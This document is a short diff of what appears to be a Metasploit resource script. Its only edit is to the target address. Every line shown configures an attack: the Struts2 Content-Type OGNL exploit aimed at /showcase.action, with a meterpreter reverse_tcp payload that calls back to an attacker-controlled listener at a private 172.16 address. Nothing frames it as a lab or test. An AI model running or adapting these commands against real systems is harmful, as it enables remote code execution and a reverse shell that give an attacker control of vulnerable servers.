@@ -1,6 +1,6 @@
 use exploit/multi/http/struts2_content_type_ognl
 set TARGETURI /showcase.action
-set RHOST 10.xxyyzz.30.101
+set RHOST 10.xxyyzz.30.10
 set RPORT 80
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set LHOST 172.16.xxyyzz.10
